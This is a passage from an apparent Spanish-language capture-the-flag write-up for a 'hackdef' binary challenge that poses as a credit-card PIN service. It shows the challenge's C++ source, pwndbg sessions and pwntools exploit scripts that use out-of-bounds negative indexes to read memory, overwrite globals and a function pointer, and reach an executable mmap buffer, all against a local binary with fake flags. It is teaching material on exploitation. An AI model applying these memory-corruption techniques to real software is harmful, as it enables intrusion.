+            std::cout</span><span class="o"> <<</span><span class="s"> "tam no valido"</span><span class="o"> <<</span><span class="p"> std::endl;
+            salir();
+        }
+    }
+}</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="no">void</span><span class="na"> consultar_NIP</span><span class="p">() {
+    </span><span class="no">puts</span><span class="p">(</span><span class="s">"Admin requerido."</span><span class="p">);
+    std::cout</span><span class="o"> <<</span><span class="s"> "User: "</span><span class="p">;
+    std::string user;
+    std::cin</span><span class="o"> >></span><span class="p"> user;
+    std::cout </span><span class="o"><< </span><span class="s">"Pass: "</span><span class="p">;
+    std::string pass;
+    std::cin</span><span class="o"> >></span><span class="p"> pass;
+
+    </span><span class="o">if</span><span class="p"> (user</span><span class="o"> ==</span><span class="s"> "admin"</span><span class="o"> &&</span><span class="p"> pass</span><span class="o"> ==</span><span class="s"> "MM</span><span class="mi">\x11</span><span class="s">N"</span><span class="p">) {
+        </span><span class="no">int</span><span class="p"> idx</span><span class="o"> =</span><span class="p"> leer_idx();
+        std::cout</span><span class="o"> <<</span><span class="s"> "SECRETO: "</span><span class="o"> <<</span><span class="p"> nip_cifrado[idx]</span><span class="o"> <<</span><span class="p"> std::endl;
+    } </span><span class="o">else</span><span class="p"> {
+        std::cout </span><span class="o"><< </span><span class="s">"NEL"</span><span class="o"> <<</span><span class="p"> std::endl;
+    }
+}</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="no">char</span><span class="p"> flag_00[</span><span class="mi">0x30</span><span class="p">];
+
+</span><span class="no">void</span><span class="na"> init_flags</span><span class="p">() {
+    std::string tmp;
+    leer_archivo(</span><span class="s">"/flag_00.txt"</span><span class="p">, tmp);
+    </span><span class="no">strcpy</span><span class="p">(flag_00, tmp.c_str());
+    </span><span class="no">strcpy</span><span class="p">(check_flag01,</span><span class="s"> "NOMOSTRAR__FLAG"</span><span class="p">);
+}</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ gdb </span><span class="p">-q chal
+Reading symbols from </span><span class="ve">chal</span><span class="p">...
+(No debugging symbols found in </span><span class="ve">chal</span><span class="p">)
+</span><span class="ro">pwndbg></span><span class="p"> r
+Starting program:</span><span class="ve"> /home/user/chal</span><span class="p">
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "</span><span class="ve">/lib/x86_64-linux-gnu/libthread_db.so.1</span><span class="p">".
+cnt_checker = 1
+Servicio interno de tarjetas de credito
+** Menu:
+1. Registrar tarjeta
+2. Registrar NIP
+3. Consultar NIP
+4. Borrar NIP
+5. Salir
+> Checking... 588
+OK</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">pwndbg></span><span class="p"> x/s &flag_00
+</span><span class="az">0x5555555bc840</span><span class="p"> &lt</span><span class="am">flag_00</span><span class="p">>:       "hackdef{0_f4k3_fl4g_4_t35t1ng}"
+</span><span class="ro">pwndbg></span><span class="p"> p/d (&flag_00 - &nip_cifrado) / 8
+</span><span class="az">$1</span><span class="p"> = -1036
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> process
+
+shell</span><span class="o"> =</span><span class="p"> process(</span><span class="s">"./chal"</span><span class="p">)
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"> "</span><span class="p">,</span><span class="no"> b</span><span class="s">"3"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">": "</span><span class="p">,</span><span class="no"> b</span><span class="s">"admin"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">": "</span><span class="p">,</span><span class="no"> b</span><span class="s">"MM</span><span class="mi">\x11</span><span class="s">N"</span><span class="p">)
+
+shell.interactive()</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3</span><span class="p"> exploit.py
+[</span><span class="ve">+</span><span class="p">] Starting local process './chal': pid 2213
+[</span><span class="az">*</span><span class="p">] Switching to interactive mode
+OK
+> </span><span class="ro">$</span><span class="p"> -1036
+SECRETO: 8891905996262433128
+Servicio interno de tarjetas de credito
+** Menu:
+1. Registrar tarjeta
+2. Registrar NIP
+3. Consultar NIP
+4. Borrar NIP
+5. Salir
+> </span><span class="ro">$</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3</span><span class="p"> -q
+>>> from pwn import p64
+>>> p64(8891905996262433128)
+b'hackdef{'
+>>></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> process, p64, log
+
+flag</span><span class="o"> =</span><span class="no"> b</span><span class="s">""
+
+</span><span class="o">for</span><span class="p"> i</span><span class="o"> in</span><span class="no"> range</span><span class="p">(</span><span class="o">-</span><span class="mi">1036</span><span class="p">,</span><span class="o"> -</span><span class="mi">1030</span><span class="p">, </span><span class="mi">1</span><span class="p">):
+    shell</span><span class="o"> =</span><span class="p"> process</span><span class="p">(</span><span class="s">"./chal"</span><span class="p">, </span><span class="ra">level</span><span class="o">=</span><span class="s">"error"</span><span class="p">)
+
+    shell.sendlineafter(</span><span class="no">b</span><span class="s">"> "</span><span class="p">,</span><span class="no"> b</span><span class="s">"3"</span><span class="p">)
+    shell.sendlineafter(</span><span class="no">b</span><span class="s">": "</span><span class="p">,</span><span class="no"> b</span><span class="s">"admin"</span><span class="p">)
+    shell.sendlineafter(</span><span class="no">b</span><span class="s">": "</span><span class="p">,</span><span class="no"> b</span><span class="s">"MM</span><span class="mi">\x11</span><span class="s">N"</span><span class="p">)
+
+    shell.sendlineafter(</span><span class="no">b</span><span class="s">"> "</span><span class="p">,</span><span class="na"> str</span><span class="p">(i).encode())
+    shell.recvuntil(</span><span class="no">b</span><span class="s">": "</span><span class="p">)
+
+    flag</span><span class="o"> +=</span><span class="p"> p64(</span><span class="na">int</span><span class="p">(shell.recvline().strip()))
+
+    </span><span class="o">if</span><span class="no"> b</span><span class="s">"}" </span><span class="o">in</span><span class="p"> flag:
+        flag</span><span class="o"> =</span><span class="p"> flag.split(</span><span class="no">b</span><span class="s">"}"</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o"> +</span><span class="no"> b</span><span class="s">"}"
+        </span><span class="o">break</span><span class="p">
+
+log.info(</span><span class="no">f</span><span class="s">"Flag:</span><span class="p"> {flag.decode()}</span><span class="s">"</span><span class="p">)</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3</span><span class="p"> exploit.py
+[</span><span class="az">*</span><span class="p">] Flag: hackdef{0_f4k3_fl4g_4_t35t1ng}</span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="flag1">
+<br><h3 class="post-title">Flag 1</h3><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="no">char</span><span class="na"> check_flag01</span><span class="p">[</span><span class="mi">0x10</span><span class="p">];
+
+</span><span class="no">void</span><span class="na"> init_flags</span><span class="p">() {
+    std::string tmp;
+    leer_archivo(</span><span class="s">"/flag_00.txt"</span><span class="p">, tmp);
+    </span><span class="no">strcpy</span><span class="p">(flag_00, tmp.c_str());
+    </span><span class="no">strcpy</span><span class="p">(check_flag01,</span><span class="s"> "NOMOSTRAR__FLAG"</span><span class="p">);
+}
+
+</span><span class="no">void</span><span class="na"> service_flag_checker</span><span class="p">() {
+    std::this_thread::sleep_for(std::chrono::seconds(</span><span class="mi">5</span><span class="p">));
+
+    </span><span class="o">if</span><span class="p"> (</span><span class="o">!</span><span class="no">memcmp</span><span class="p">(check_flag01,</span><span class="s"> "MOSTRAR_FLAG_SI</span><span class="mi">\0</span><span class="s">"</span><span class="p">, </span><span class="mi">0x10</span><span class="p">)){
+        imprimir_flag(</span><span class="s">"/flag_01.txt"</span><span class="p">);
+    } </span><span class="o">else if</span><span class="p"> (addr_fn000</span><span class="o"> ==</span><span class="p"> fn_000) {
+        imprimir_flag(</span><span class="s">"/flag_02.txt"</span><span class="p">);
+    } </span><span class="o">else if</span><span class="p"> (handlers[</span><span class="mi">0</span><span class="p">]</span><span class="o"> !=</span><span class="p"> fn_000) {
+        imprimir_flag(</span><span class="s">"/flag_03.txt"</span><span class="p">);
+    }
+}</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">pwndbg></span><span class="p"> x/s &check_flag01
+</span><span class="az">0x5555555bc870</span><span class="p"> &lt</span><span class="am">check_flag01</span><span class="p">>:  "NOMOSTRAR__FLAG"
+</span><span class="ro">pwndbg></span><span class="p"> p/d (&check_flag01 - &nip_cifrado) / 8
+</span><span class="az">$1</span><span class="p"> = -1030
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> gdb
+
+shell</span><span class="o"> =</span><span class="p"> gdb.debug(</span><span class="s">"./chal"</span><span class="p">,</span><span class="s"> "continue"</span><span class="p">)
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"> "</span><span class="p">,</span><span class="no"> b</span><span class="s">"2"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"> "</span><span class="p">,</span><span class="no"> b</span><span class="s">"-1030"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">": "</span><span class="p">,</span><span class="no"> b</span><span class="s">"16"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">": "</span><span class="p">,</span><span class="no"> b</span><span class="s">"MOSTRAR_FLAG_SI</span><span class="mi">\x00</span><span class="s">"</span><span class="p">)
+
+shell.interactive()</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3</span><span class="p"> exploit.py
+[</span><span class="ve">+</span><span class="p">] Starting local process '/usr/bin/gdbserver': pid 3771
+[</span><span class="az">*</span><span class="p">] running in new terminal: ['/usr/bin/gdb', '-q', './chal']
+[</span><span class="az">*</span><span class="p">] Switching to interactive mode
+OK
+Servicio interno de tarjetas de credito
+** Menu:
+1. Registrar tarjeta
+2. Registrar NIP
+3. Consultar NIP
+4. Borrar NIP
+5. Salir
+> </span><span class="ro">$</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">pwndbg></span><span class="p"> x/s &check_flag01
+</span><span class="az">0x5e7f3d479870 </span><span class="p">&lt</span><span class="am">check_flag01</span><span class="p">>:  "MOSTRAR_FLAG_SI"
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> process, log
+
+shell </span><span class="o">= </span><span class="p">process(</span><span class="s">"./chal"</span><span class="p">)
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"> "</span><span class="p">,</span><span class="no"> b</span><span class="s">"2"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"> "</span><span class="p">,</span><span class="no"> b</span><span class="s">"-1030"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">": "</span><span class="p">,</span><span class="no"> b</span><span class="s">"16"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">": "</span><span class="p">,</span><span class="no"> b</span><span class="s">"MOSTRAR_FLAG_SI</span><span class="mi">\x00</span><span class="s">"</span><span class="p">)
+
+shell.recvuntil(</span><span class="no">b</span><span class="s">"> "</span><span class="p">)
+flag</span><span class="o"> =</span><span class="p"> shell.recvline_contains(</span><span class="no">b</span><span class="s">"hackdef"</span><span class="p">)
+
+log.info(</span><span class="no">f</span><span class="s">"Flag:</span><span class="p"> {flag.decode()}</span><span class="s">"</span><span class="p">)</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3</span><span class="p"> exploit.py
+[</span><span class="ve">+</span><span class="p">] Starting local process './chal': pid 2500
+[</span><span class="az">*</span><span class="p">] Flag: hackdef{1_f4k3_fl4g_4_t35t1ng}
+[</span><span class="az">*</span><span class="p">] Stopped process './chal' (pid 2500)</span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="flag2">
+<br><h3 class="post-title">Flag 2</h3><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">CheckFunc addr_fn000</span><span class="o"> =</span><span class="mi"> 0</span><span class="p">;
+
+</span><span class="no">void</span><span class="na"> service_flag_checker</span><span class="p">() {
+    std::this_thread::sleep_for(std::chrono::seconds(</span><span class="mi">5</span><span class="p">));
+
+    </span><span class="o">if</span><span class="p"> (</span><span class="o">!</span><span class="no">memcmp</span><span class="p">(check_flag01,</span><span class="s"> "MOSTRAR_FLAG_SI</span><span class="mi">\0</span><span class="s">"</span><span class="p">, </span><span class="mi">0x10</span><span class="p">)){
+        imprimir_flag(</span><span class="s">"/flag_01.txt"</span><span class="p">);
+    } </span><span class="o">else if</span><span class="p"> (addr_fn000</span><span class="o"> ==</span><span class="p"> fn_000) {
+        imprimir_flag(</span><span class="s">"/flag_02.txt"</span><span class="p">);
+    } </span><span class="o">else if</span><span class="p"> (handlers[</span><span class="mi">0</span><span class="p">]</span><span class="o"> !=</span><span class="p"> fn_000) {
+        imprimir_flag(</span><span class="s">"/flag_03.txt"</span><span class="p">);
+    }
+}</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">pwndbg></span><span class="p"> x/4gx &handlers
+</span><span class="az">0x5555555ba400</span><span class="p"> &lt</span><span class="am">handlers</span><span class="p">>:      0x00007ffff7f840f9      0x00007ffff7f8414a
+</span><span class="az">0x5555555ba410</span><span class="p"> &lt</span><span class="am">handlers</span><span class="p">+16>:   0x00007ffff7f8419b      0x00007ffff7f841ec
+</span><span class="ro">pwndbg></span><span class="p"> x/i 0x00007ffff7f840f9
+   </span><span class="az">0x7ffff7f840f9</span><span class="p"> &lt</span><span class="am">_Z6fn_000PiS_S_S_S_</span><span class="p">>:</span><span class="ve">        endbr64
+</span><span class="ro">pwndbg></span><span class="p"> p/d (&handlers - &nip_cifrado) / 8
+</span><span class="az">$1</span><span class="p"> = -2196
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">pwndbg></span><span class="p"> x/gx &addr_fn000
+</span><span class="az">0x5555555bc880</span><span class="p"> &lt</span><span class="am">addr_fn000</span><span class="p">>:    0x0000000000000000
+</span><span class="ro">pwndbg></span><span class="p"> p/d (&addr_fn000 - &nip_cifrado) / 8
+</span><span class="az">$2 </span><span class="p">= -1028
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> gdb, p64
+
+shell</span><span class="o"> =</span><span class="p"> gdb.debug(</span><span class="s">"./chal"</span><span class="p">,</span><span class="s"> "continue"</span><span class="p">)
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"> "</span><span class="p">,</span><span class="no"> b</span><span class="s">"3"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">": "</span><span class="p">,</span><span class="no"> b</span><span class="s">"admin"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">": "</span><span class="p">,</span><span class="no"> b</span><span class="s">"MM</span><span class="mi">\x11</span><span class="s">N"</span><span class="p">)
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"> "</span><span class="p">,</span><span class="no"> b</span><span class="s">"-2196"</span><span class="p">)
+shell.recvuntil(</span><span class="no">b</span><span class="s">": "</span><span class="p">)
+
+fn_000</span><span class="o"> =</span><span class="na"> int</span><span class="p">(shell.recvline().strip())
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"> "</span><span class="p">,</span><span class="no"> b</span><span class="s">"2"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"> "</span><span class="p">, </span><span class="no">b</span><span class="s">"-1028"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">": "</span><span class="p">,</span><span class="no"> b</span><span class="s">"8"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">": "</span><span class="p">, p64(fn_000))
+
+shell.interactive()</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">pwndbg></span><span class="p"> x/gx &addr_fn000
+</span><span class="az">0x5acd81702880</span><span class="p"> &lt</span><span class="am">addr_fn000</span><span class="p">>:    0x0000769b3c8030f9
+</span><span class="ro">pwndbg></span><span class="p"> x/gx &handlers
+</span><span class="az">0x5acd81700400 </span><span class="p">&lt</span><span class="am">handlers</span><span class="p">>:      0x0000769b3c8030f9
+</span><span class="ro">pwndbg></span><span class="p"> p/x &fn_000
+</span><span class="az">$1</span><span class="p"> = 0x769b3c8030f9
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> process, p64, log
+
+shell</span><span class="o"> =</span><span class="p"> process(</span><span class="s">"./chal"</span><span class="p">)
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"> "</span><span class="p">,</span><span class="no"> b</span><span class="s">"3"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">": "</span><span class="p">,</span><span class="no"> b</span><span class="s">"admin"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">": "</span><span class="p">,</span><span class="no"> b</span><span class="s">"MM</span><span class="mi">\x11</span><span class="s">N"</span><span class="p">)
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"> "</span><span class="p">,</span><span class="no"> b</span><span class="s">"-2196"</span><span class="p">)
+shell.recvuntil(</span><span class="no">b</span><span class="s">": "</span><span class="p">)
+
+addr_fn000</span><span class="o"> =</span><span class="na"> int</span><span class="p">(shell.recvline().strip())
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"> "</span><span class="p">,</span><span class="no"> b</span><span class="s">"2"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"> "</span><span class="p">, </span><span class="no">b</span><span class="s">"-1028"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">": "</span><span class="p">,</span><span class="no"> b</span><span class="s">"8"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">": "</span><span class="p">, p64(addr_fn000))
+
+shell.recvuntil(</span><span class="no">b</span><span class="s">"> "</span><span class="p">)
+flag</span><span class="o"> =</span><span class="p"> shell.recvline_contains(</span><span class="no">b</span><span class="s">"hackdef"</span><span class="p">)
+
+log.info(</span><span class="no">f</span><span class="s">"Flag:</span><span class="p"> {flag.decode()}</span><span class="s">"</span><span class="p">)</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3</span><span class="p"> exploit.py
+[</span><span class="ve">+</span><span class="p">] Starting local process './chal': pid 2708
+[</span><span class="az">*</span><span class="p">] Flag: hackdef{2_f4k3_fl4g_4_t35t1ng}
+[</span><span class="az">*</span><span class="p">] Stopped process './chal' (pid 2708)</span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="flag3">
+<br><h3 class="post-title">Flag 3</h3><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="no">void</span><span class="na"> service_flag_checker</span><span class="p">() {
+    std::this_thread::sleep_for(std::chrono::seconds(</span><span class="mi">5</span><span class="p">));
+
+    </span><span class="o">if</span><span class="p"> (</span><span class="o">!</span><span class="no">memcmp</span><span class="p">(check_flag01,</span><span class="s"> "MOSTRAR_FLAG_SI</span><span class="mi">\0</span><span class="s">"</span><span class="p">, </span><span class="mi">0x10</span><span class="p">)){
+        imprimir_flag(</span><span class="s">"/flag_01.txt"</span><span class="p">);
+    } </span><span class="o">else if</span><span class="p"> (addr_fn000</span><span class="o"> ==</span><span class="p"> fn_000) {
+        imprimir_flag(</span><span class="s">"/flag_02.txt"</span><span class="p">);
+    } </span><span class="o">else if</span><span class="p"> (handlers[</span><span class="mi">0</span><span class="p">]</span><span class="o"> !=</span><span class="p"> fn_000) {
+        imprimir_flag(</span><span class="s">"/flag_03.txt"</span><span class="p">);
+    }
+}</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">pwndbg></span><span class="p"> x/gx &handlers
+</span><span class="az">0x5555555ba400</span><span class="p"> &lt</span><span class="am">handlers</span><span class="p">>:      0x00007ffff7f840f9
+</span><span class="ro">pwndbg></span><span class="p"> p/d (&handlers - &nip_cifrado) / 8
+</span><span class="az">$1</span><span class="p"> = -2196
+</span><span class="ro">pwndbg></span><span class="p"> p/x &fn_000
+</span><span class="az">$2</span><span class="p"> = 0x7ffff7f840f9
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> gdb
+
+shell</span><span class="o"> =</span><span class="p"> gdb.debug(</span><span class="s">"./chal"</span><span class="p">,</span><span class="s"> "continue"</span><span class="p">)
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"> "</span><span class="p">,</span><span class="no"> b</span><span class="s">"2"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"> "</span><span class="p">,</span><span class="no"> b</span><span class="s">"-2196"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">": "</span><span class="p">,</span><span class="no"> b</span><span class="s">"8"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">": "</span><span class="p">,</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="mi"> 8</span><span class="p">)
+
+shell.interactive()</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">pwndbg></span><span class="p"> x/gx &handlers
+</span><span class="az">0x637744cc5400</span><span class="p"> &lt</span><span class="am">handlers</span><span class="p">>:      0x4141414141414141
+</span><span class="ro">pwndbg></span><span class="p"> p/x &fn_000
+</span><span class="az">$1</span><span class="p"> = 0x715ebd74e0f9
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> process, log
+
+shell</span><span class="o"> =</span><span class="p"> process(</span><span class="s">"./chal"</span><span class="p">)
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"> "</span><span class="p">,</span><span class="no"> b</span><span class="s">"2"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"> "</span><span class="p">,</span><span class="no"> b</span><span class="s">"-2196"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">": "</span><span class="p">,</span><span class="no"> b</span><span class="s">"8"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">": "</span><span class="p">,</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="mi"> 8</span><span class="p">)
+
+shell.recvuntil(</span><span class="no">b</span><span class="s">"> "</span><span class="p">)
+flag</span><span class="o"> =</span><span class="p"> shell.recvline_contains(</span><span class="no">b</span><span class="s">"hackdef"</span><span class="p">)
+
+log.info(</span><span class="no">f</span><span class="s">"Flag:</span><span class="p"> {flag.decode()}</span><span class="s">"</span><span class="p">)</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3</span><span class="p"> exploit.py
+[</span><span class="ve">+</span><span class="p">] Starting local process './chal': pid 2789
+[</span><span class="az">*</span><span class="p">] Flag: hackdef{3_f4k3_fl4g_4_t35t1ng}
+[</span><span class="az">*</span><span class="p">] Stopped process './chal' (pid 2789)</span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="flag4">
+<br><h3 class="post-title">Flag 4</h3><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="o">case</span><span class="mi"> 0x52e6</span><span class="p">:
+    </span><span class="o">if</span><span class="p"> (op_reporte) {
+        op_reporte </span><span class="o">=</span><span class="mi"> false</span><span class="p">;
+        info_reporte();
+    } </span><span class="o">else</span><span class="p"> {
+        </span><span class="no">puts</span><span class="p">(</span><span class="s">"No no no"</span><span class="p">);
+    }
+    </span><span class="o">break</span><span class="p">;</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="o">#define </span><span class="na">TAM_SHELLCODE</span><span class="mi"> 0x1000
+
+</span><span class="no">void</span><span class="na"> info_reporte</span><span class="p">() {
+    std::cout</span><span class="o"> <<</span><span class="s"> "Levantando reporte..."</span><span class="o"> <<</span><span class="p"> std::endl;
+    std::cout</span><span class="o"> <<</span><span class="s"> "Tam de reporte: "</span><span class="o"> <<</span><span class="p"> std::endl;
+    </span><span class="no">unsigned int</span><span class="p"> n;
+    std::cin</span><span class="o"> >></span><span class="p"> n;
+
+    </span><span class="o">if</span><span class="p"> (n</span><span class="o"> ></span><span class="p"> TAM_SHELLCODE) {
+        std::cout</span><span class="o"> <<</span><span class="s"> "Reporte muy grande"</span><span class="o"> <<</span><span class="p"> std::endl;
+        salir();
+    }
+
+    </span><span class="no">void</span><span class="o"> *</span><span class="p">mem</span><span class="o"> =</span><span class="p"> mmap(</span><span class="mi">nullptr</span><span class="p">, n</span><span class="o"> +</span><span class="mi"> 0x10</span><span class="p">, PROT_READ </span><span class="o">|</span><span class="p"> PROT_WRITE </span><span class="o">| </span><span class="p">PROT_EXEC, MAP_PRIVATE</span><span class="o"> |</span><span class="p"> MAP_ANONYMOUS, </span><span class="o">-</span><span class="mi">1</span><span class="p">, </span><span class="mi">0</span><span class="p">);
+
+    </span><span class="o">if</span><span class="p"> (mem</span><span class="o"> ==</span><span class="p"> MAP_FAILED) {
+        std::cout</span><span class="o"> <<</span><span class="s"> "Error al levantar reporte. Contacta admin"</span><span class="o"> <<</span><span class="p"> std::endl;
+        </span><span class="o">return</span><span class="p">;
+    }
+
+    std::cout </span><span class="o"><< </span><span class="s">"Ingresa detalles:"</span><span class="p">;
+    lee_basura_endl();
+    </span><span class="no">fread</span><span class="p">(mem,</span><span class="mi"> 1</span><span class="p">, n, stdin);
+
+    std::cout</span><span class="o"> <<</span><span class="s"> "Reporte enviado. Numero de seguimiento: "</span><span class="o"> <<</span><span class="p"> (</span><span class="na">uint64_t</span><span class="p">) (mem) </span><span class="o"><< </span><span class="p">std::endl;
+    imprimir_flag(</span><span class="s">"/flag_04.txt"</span><span class="p">);
+}</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> process, log
+
+shell</span><span class="o"> =</span><span class="p"> process(</span><span class="s">"./chal"</span><span class="p">)
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"> "</span><span class="p">,</span><span class="no"> b</span><span class="s">"21222"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">": </span><span class="mi">\n</span><span class="s">"</span><span class="p">,</span><span class="no"> b</span><span class="s">"8"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">":"</span><span class="p">,</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="mi"> 8</span><span class="p">)
+
+flag </span><span class="o">=</span><span class="p"> shell.recvline_contains(</span><span class="no">b</span><span class="s">"hackdef"</span><span class="p">)
+
+log.info(</span><span class="no">f</span><span class="s">"Flag: </span><span class="p">{flag.decode()}</span><span class="s">"</span><span class="p">)</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
